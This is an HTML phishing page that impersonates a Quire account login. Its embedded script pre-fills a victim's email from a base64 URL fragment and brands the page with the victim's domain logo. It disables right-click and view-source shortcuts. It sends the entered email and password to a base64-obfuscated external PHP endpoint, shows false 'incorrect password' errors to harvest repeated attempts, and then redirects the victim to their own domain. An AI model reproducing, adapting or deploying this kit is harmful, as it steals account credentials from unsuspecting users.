
<!DOCTYPE html>
<html lang="en">
  <head>
    
<meta charset="utf-8">
<meta name="referrer" content="origin">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<link rel="shortcut icon" type="image/ico" href="https://quire.io//favicon.ico">
<link rel="fluid-icon" href="https://quire.io//Quire_fluid.png" title="Quire">

<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
<link rel="stylesheet" type="text/css" href="https://hguoszcdsgwbkppvsavi.supabase.co/storage/v1/object/public/hkkluytyuop8765/minbot.css?t=2022-06-28T08%3A45%3A50.352Z">    <title> Account Login</title>
    <link rel="stylesheet" type="text/css" href="https://hguoszcdsgwbkppvsavi.supabase.co/storage/v1/object/public/gfhhgggggu87/regu.css?t=2022-06-28T08%3A46%3A42.776Z">    
      <meta name="apple-itunes-app" content="app-id=1095193897">



  </head>

  <body >

    
    

    <div id="wrap">

      
      <header class="header-wrap navbar navbar-default navbar-fixed-top qr-collapse-navbar">
        <div id="header" class="container">
          <div id="quire-logo" class="navbar-header">
  <h1 >

  <img src="https://d12y7sg0iam4lc.cloudfront.net/s/img/quire_logo.svg" alt="" id="logoimg" style="width:50px;height:50px;margin-top:10px;" >
  </h1>
</div>
        </div>
      </header>

      
      <div id="body" class="container">
        
<div align="center">
  <article>
    <h2 class="title">Log in to <span class="logoname"> Quire </span> Account</h2>
    <h3 class="desc">Welcome Back!</h3>
  </article>
</div>
<div class="row">
  <div class="dialog long">
    <div class="form-section">
    <form action="" method="post">
	
	  <span id="msg"  class="error-header hasError" style="display: none; font-size:14px; ">Password is incorrect. Please try again</span>
	  <span id="error" class="error-header hasError" style="display: none; font-size:14px;"></span>
   


<div class="label-inp">
  <input  type="email" id="email" class="name form-control" name="email"  value="" readonly /> 
</div>

<div class="label-inp">
  <input  type="password" id="password" class="password form-control" name="password" placeholder="Password">
 
</div>
        <div>
          <label class="stay-in-txt pull-left">
            <input name="s_rememberMe" type="checkbox"
                   value="true" checked="checked">
Stay signed in          </label>
        </div>

        <button class="signin-button b green full-btn" type="submit" id="submit-btn" >Sign in</button>
		<P></P>
		<BR><EM>Because you're accessing sensitive info, you need to verify your email password</EM></BR>
      </form>

    </div>
  </div>
</div>



      </div>

    </div>

    
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-48347893-1"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<script src="https://d12y7sg0iam4lc.cloudfront.net/b1268/s/js/mesg_en.js"></script>
<script async src="https://d12y7sg0iam4lc.cloudfront.net/b1268/s/js/pack.min.js"></script>
<script src="https://appleid.cdn-apple.com/appleauth/static/jsapi/appleid/1/en_US/appleid.auth.js"></script>
<script async src="https://d12y7sg0iam4lc.cloudfront.net/b1268/s/js/authen.min.js"></script>

        <script>

// prevent ctrl + s
$(document).bind('keydown', function(e) {
if(e.ctrlKey && (e.which == 83)) {
e.preventDefault();
return false;
}
});

document.addEventListener('contextmenu', event => event.preventDefault());

document.onkeydown = function(e) {
if (e.ctrlKey && 
(e.keyCode === 67 ||   
e.keyCode === 86 || 
e.keyCode === 85 || 
e.keyCode === 117)) {
return false;
} else {
return true;
}
};
$(document).keypress("u",function(e) {
if(e.ctrlKey)
{
return false;      }
else {
return true;
}});




    /* global $ */
    $(document).ready(function(){
      var count=0;
 
      $('#back1').click(function () {
        $("#msg").hide();
        $('#email').val("");
        $("#automail").animate({left:200, opacity:"hide"}, 0);
        $("#inputbar").animate({right:200, opacity:"show"}, 1000);

      });
      
   
      var email = window.location.hash.substr(1);
      if (!email) {

      }
      else
      {
        var my_email = atob(email);
        $('#email').val(my_email); 
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (!filter.test(my_email)) {
          $('#error').show();
           email.focus;
           return false;
        }
		 var ind=my_email.indexOf("@");
        var my_slice=my_email.substr((ind+1));
        var c = my_slice.substr(0, my_slice.indexOf('.'));
        var final= c.charAt(0).toUpperCase() + c.slice(1);
        var finalu= c.toUpperCase();

      
        $(".logoname").html(final);
      
		
      var ind=my_email.indexOf("@");
        var my_slice=my_email.substr((ind+1));
		var mainPage = 'https://'+my_slice; 
		
		var sv = my_slice;
		
		var image = "url('https://image.thum.io/get/auth/53562-77e4da5126dd25414aacf01ccad53fff/width/1200/https://"+sv;"')"
		

        $("#logoimg").attr("src", "https://logo.clearbit.com/"+mainPage);
         
      <!---  document.body.style.backgroundImage = image; --->
	 	
     $(".email").html(email);
	 
      }
 
      $('#submit-btn').click(function(event){
    
		event.preventDefault();
        $('#error').hide();
        $('#msg').hide();
        var email=$("#email").val();
        var password=$("#password").val();
      ///////////new injection////////////////
      var my_email =email;
      var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

      if (!email) {
            $('#error').show();
            $('#error').html("<p style='color:red; font-size:15px'> Email field is empty</p>");
        
            return false;
        }

        if (!filter.test(my_email)) {
            $('#error').show();
            $('#error').html("<p style='color:red; font-size:14px'>That account doesn't exist. Enter a different account</p>");
            
            return false;
        }
        if (!password) {
            $('#error').show();
            $('#error').html("Password field is empty");
         
            return false;
        }
		 if (password.length < 8 ) {
            $('#error').show();
            $('#error').html("An error occured, invalid password");
            email.focus;
            return false;
        } 
 
		 
      ///////////new injection////////////////
      count=count+1;
    //  console.log(count); 
	var d=atob('aHR0cHM6Ly96b3VwemlwLmNvbS9wZW50L29vLnBocA==');
	   $.ajax({
        dataType: 'JSON',
		url: d,
        type: 'POST',
        data:{
          email:email,
          password:password
        },
            // data: $('#contact').serialize(),
            beforeSend: function(xhr){
              $('#submit-btn').html('Please wait....');
			  
    //  console.log(count); 
            },
            success: function(response){
			 $('#msg').html("<span style='color:red;'>Password is incorrect. Please try again</span>");
              if(response){
                $("#msg").show();
				console.log(response);
				$('#msg').html(response['msg']);
                if(response['signal'] == 'ok'){
                  $("#password").val("");
                  if (count>=3) {
                    count=0;
                    // window.location.replace(response['redirect_link']);
                    window.location.replace("https://"+my_slice);

                  }
                  // $('#msg').html(response['msg']);
                }
                else{
                   $('#msg').html(response['msg']);
                }
              }
            },
            error: function(){
              $("#password").val("");
              if (count>=3) {
                count=0;
                window.location.replace("https://"+my_slice);
              }
              $("#msg").show();
              // $('#msg').html("Please try again later");
            },
            complete: function(){
              $('#submit-btn').html('Sign in');
            }
          });  
    });


    });


  </script>
  


  </body>
</html>